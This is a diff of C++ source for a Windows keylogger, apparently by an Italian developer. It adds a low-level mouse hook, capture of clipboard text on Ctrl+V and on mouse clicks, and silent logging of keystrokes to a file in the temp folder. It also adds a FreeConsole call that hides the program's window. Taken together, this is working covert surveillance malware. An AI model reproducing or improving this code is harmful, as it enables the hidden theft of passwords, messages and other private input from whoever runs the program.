@@ -5,55 +5,62 @@
 
 #pragma comment(lib, "user32.lib") // user32.dll windows' library
 
-#define VK_0	0x30	// 48 - '0'
-#define VK_1	0x31	// 49 - '1'
-#define VK_2	0x32	// 50 - '2'
-#define VK_3	0x33	// 51 - '3'
-#define VK_4	0x34	// 52 - '4'
-#define VK_5	0x35	// 53 - '5'
-#define VK_6	0x36	// 54 - '6'
-#define VK_7	0x37	// 55 - '7'
-#define VK_8	0x38	// 56 - '8'
-#define VK_9	0x39	// 57 - '9'
+#define VK_0	0x30	// '0'
+#define VK_1	0x31	// '1'
+#define VK_2	0x32	// '2'
+#define VK_3	0x33	// '3'
+#define VK_4	0x34	// '4'
+#define VK_5	0x35	// '5'
+#define VK_6	0x36	// '6'
+#define VK_7	0x37	// '7'
+#define VK_8	0x38	// '8'
+#define VK_9	0x39	// '9'
 
-#define VK_A	0x41	// 65 - 'A'
-#define VK_B	0x42	// 66 - 'B'
-#define VK_C	0x43	// 67 - 'C'
-#define VK_D	0x44	// 68 - 'D'
-#define VK_E	0x45	// 69 - 'E'
-#define VK_F	0x46	// 70 - 'F'
-#define VK_G	0x47	// 71 - 'G'
-#define VK_H	0x48	// 72 - 'H'
-#define VK_I	0x49	// 73 - 'I'
-#define VK_J	0x4A	// 74 - 'J'
-#define VK_K	0x4B	// 75 - 'K'
-#define VK_L	0x4C	// 76 - 'L'
-#define VK_M	0x4D	// 77 - 'M'
-#define VK_N	0x4E	// 78 - 'N'
-#define VK_O	0x4F	// 79 - 'O'
-#define VK_P	0x50	// 80 - 'P'
-#define VK_Q	0x51	// 81 - 'Q'
-#define VK_R	0x52	// 82 - 'R'
-#define VK_S	0x53	// 83 - 'S'
-#define VK_T	0x54	// 84 - 'T'
-#define VK_U	0x55	// 85 - 'U'
-#define VK_V	0x56	// 86 - 'V'
-#define VK_W	0x57	// 87 - 'W'
-#define VK_X	0x58	// 88 - 'X'
-#define VK_Y	0x59	// 89 - 'Y'
-#define VK_Z	0x5A	// 90 - 'Z'
+#define VK_A	0x41	// 'A'
+#define VK_B	0x42	// 'B'
+#define VK_C	0x43	// 'C'
+#define VK_D	0x44	// 'D'
+#define VK_E	0x45	// 'E'
+#define VK_F	0x46	// 'F'
+#define VK_G	0x47	// 'G'
+#define VK_H	0x48	// 'H'
+#define VK_I	0x49	// 'I'
+#define VK_J	0x4A	// 'J'
+#define VK_K	0x4B	// 'K'
+#define VK_L	0x4C	// 'L'
+#define VK_M	0x4D	// 'M'
+#define VK_N	0x4E	// 'N'
+#define VK_O	0x4F	// 'O'
+#define VK_P	0x50	// 'P'
+#define VK_Q	0x51	// 'Q'
+#define VK_R	0x52	// 'R'
+#define VK_S	0x53	// 'S'
+#define VK_T	0x54	// 'T'
+#define VK_U	0x55	// 'U'
+#define VK_V	0x56	// 'V'
+#define VK_W	0x57	// 'W'
+#define VK_X	0x58	// 'X'
+#define VK_Y	0x59	// 'Y'
+#define VK_Z	0x5A	// 'Z'
 
 // redefine some keys for the Italian keyboard
 // SC stay for "Special Characters" with accent
-#define VK_SC_E				VK_OEM_1		// èé[{
-#define VK_SC_O				VK_OEM_3		// òç@
-#define VK_SC_A				VK_OEM_7		// à°#
-#define VK_SC_U				VK_OEM_2		// ù§
-#define VK_SC_I				VK_OEM_6		// ì^
-#define VK_BACKSLASH		VK_OEM_5		// \|
-#define VK_APOSTROPHE		VK_OEM_4		// '?
+#define VK_SC_E				0xBA	// èé[{ (VK_OEM_3)
+#define VK_SC_O				0xC0	// òç@	(VK_OEM_1)
+#define VK_SC_A				0xDE	// à°#	(VK_OEM_7)
+#define VK_SC_U				0xBF	// ù§	(VK_OEM_2)
+#define VK_SC_I				0xDD	// ì^	(VK_OEM_6)
+#define VK_BACKSLASH		0xDC	// \|	(VK_OEM_5)
+#define VK_APOSTROPHE		0xDB	// '?	(VK_OEM_4)
 
 HHOOK g_hook;
+HHOOK mouseHook;
+
+char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFolder Path
+DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
+const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
+
+std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
 
 // Keyboard hook
 static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -72,8 +79,32 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		int vkCode = pKeyboardStruct->vkCode;
 		std::string message("");
 
+		// checking CTRL + V
+		if (isCtrlPressed && vkCode == VK_V)
+		{
+			// checking if the clipboard is open
+			if (OpenClipboard(NULL))
+			{
+				// getting the clipboard data
+				HANDLE hData = GetClipboardData(CF_TEXT);
+				if (hData != NULL)
+				{
+					// getting the text from the clipboard by locking it
+					char* text = static_cast<char*>(GlobalLock(hData));
+					if (text != NULL)
+					{
+						message.append("\n--- CTRL + V ---\n");
+						message.append(text);
+						message.append("\n--/FINE -> CTRL + V*\\--\n");
+						// unlocking the clipboard
+						GlobalUnlock(hData);
+					}
+				}
+				CloseClipboard();
+			}
+		}
 		// checking TAB and SPACE
-		if (!isShiftPressed && !(isCapsLockActive) && (vkCode == VK_SPACE || vkCode == VK_TAB) && !isCtrlPressed)
+		else if (!isShiftPressed && !(isCapsLockActive) && (vkCode == VK_SPACE || vkCode == VK_TAB) && !isCtrlPressed)
 		{
 			if (vkCode == VK_TAB) message = "|TAB|";
 			else if (vkCode == VK_SPACE) message = " ";
@@ -266,27 +297,31 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			}
 		}
 		// ARROWS (UP, DOWN, LEFT, RIGHT)
-		else if (!isShiftPressed && !isAltGrPressed && (vkCode >= VK_LEFT && vkCode <= VK_DOWN))
+		else if (!isShiftPressed && !isAltGrPressed && (vkCode >= VK_LEFT && vkCode <= VK_DOWN)|| (!isNumLockActive && vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9))
 		{
+			if (isCtrlPressed)
+				message = "|CTRL->";
+			else
+				message = "|->";
 			switch (vkCode)
 			{
+			case VK_NUMPAD4:
 			case VK_LEFT: // LEFT
-				message = "L|";
+				message.append("L|");
 				break;
+			case VK_NUMPAD8:
 			case VK_UP: // UP
-				message = "U|";
+				message.append("U|");
 				break;
+			case VK_NUMPAD6:
 			case VK_RIGHT: // RIGHT
-				message = "R|";
+				message.append("R|");
 				break;
+			case VK_NUMPAD2:
 			case VK_DOWN: // DOWN
-				message = "D|";
+				message.append("D|");
 				break;
 			}
-			if (isCtrlPressed)
-				message = "|CTRL->" + message;
-			else
-				message = "|->" + message;
 		}
 		// BACKSPACE
 		else if (!isShiftPressed && !isAltGrPressed && vkCode == VK_BACK)
@@ -339,6 +374,36 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			message = "\n";
 		}
+		// INSERT
+		else if (vkCode == VK_INSERT || (!isNumLockActive && vkCode == VK_NUMPAD0))
+		{
+			message = "|INS|";
+		}
+		// PAGE UP
+		else if (vkCode == VK_PRIOR || (!isNumLockActive && vkCode == VK_NUMPAD9))
+		{
+			message = "|PAGE_UP|";
+		}
+		// PAGE DOWN
+		else if (vkCode == VK_NEXT || (!isNumLockActive && vkCode == VK_NUMPAD3))
+		{
+			message = "|PAGE_DOWN|";
+		}
+		// END
+		else if (vkCode == VK_END || (!isNumLockActive && vkCode == VK_NUMPAD1))
+		{
+			message = "|END|";
+		}
+		// HOME
+		else if (vkCode == VK_HOME || (!isNumLockActive && vkCode == VK_NUMPAD7))
+		{
+			message = "|HOME|";
+		}
+		// ESCAPE
+		else if (vkCode == VK_ESCAPE)
+		{
+			message = "|ESC|";
+		}
 
 		if (vkCode == VK_ESCAPE			// ESC
 			|| vkCode == VK_F1			// F1
@@ -366,29 +431,81 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			|| vkCode == VK_SNAPSHOT	// STAMP/R SIST (PRINT)
 			|| vkCode == VK_SCROLL		// BLOCC SCORR
 			|| vkCode == VK_PAUSE		// PAUSA/INTERR
-			|| vkCode == VK_PRIOR		// PAG UP
-			|| vkCode == VK_NEXT		// PAG DOWN
-			|| vkCode == VK_END			// END
-			|| vkCode == VK_HOME		// HOME
-			|| vkCode == VK_INSERT		// INS
 			|| vkCode == VK_CLEAR		// NUMBER FIVE OF NUMERIC KEYPAD WHEN "NUM_LOCK" IS DISABLED
 			) return CallNextHookEx(g_hook, nCode, wParam, lParam);
 
-		// scrivo il messaggio sul file
-		std::ofstream file("log.txt", std::ios::app);
-		file << message;
+		// save the message in a file
+		std::ofstream file(FilePath, std::ios::app);
+		if (file.is_open()) file << message;
 		file.close();
+
+		std::cout << message;
 
 	}
 	// return control to the Operating System
 	return CallNextHookEx(g_hook, nCode, wParam, lParam);
 }
 
+static void checkPossibleCopy(std::string& testo)
+{
+	if (OpenClipboard(NULL))
+	{
+		HANDLE hData = GetClipboardData(CF_TEXT);
+		if (hData != NULL)
+		{
+			char* text = static_cast<char*>(GlobalLock(hData));
+			if (text != NULL)
+			{
+				if (clipBoardLastSave != text)
+				{
+					testo.append("\n--Possibile copia con il mouse--\n");
+					testo.append(text);
+					testo.append("\n--/*FINE*\\--\n");
+					clipBoardLastSave = text;
+				}
+				GlobalUnlock(hData);
+			}
+		}
+		CloseClipboard();
+	}
+}
+
+// Callback funciton for the mouseHook
+static LRESULT CALLBACK MouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	// Verifyng if the mouse event is a click
+	if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
+	{
+		std::string message = "";
+		if (wParam == WM_LBUTTONDOWN)
+		{
+			message = "|<M|";
+		}
+		else if (wParam == WM_RBUTTONDOWN)
+		{
+			message = "|M>|";
+		}
+		else if (wParam == WM_MBUTTONDOWN)
+			message = "|M|";
+		checkPossibleCopy(message);
+		// save the message in a file
+		std::ofstream file(FilePath, std::ios::app);
+		if (file.is_open()) file << message;
+		file.close();
+	}
+
+	// Leaving the system its next job of the chain (the next hook)
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
 // main function
 int main()
 {
+	FreeConsole(); // disconnect the console when the program is running
+	
 	HINSTANCE hInstance = GetModuleHandle(nullptr);
 	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
+	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, hInstance, 0);
 
 	if (g_hook == nullptr) return EXIT_FAILURE;
 
@@ -399,6 +516,7 @@ int main()
 		DispatchMessage(&msg);
 	}
 
+	UnhookWindowsHookEx(mouseHook);
 	UnhookWindowsHookEx(g_hook);
 
 	return ERROR_SUCCESS;
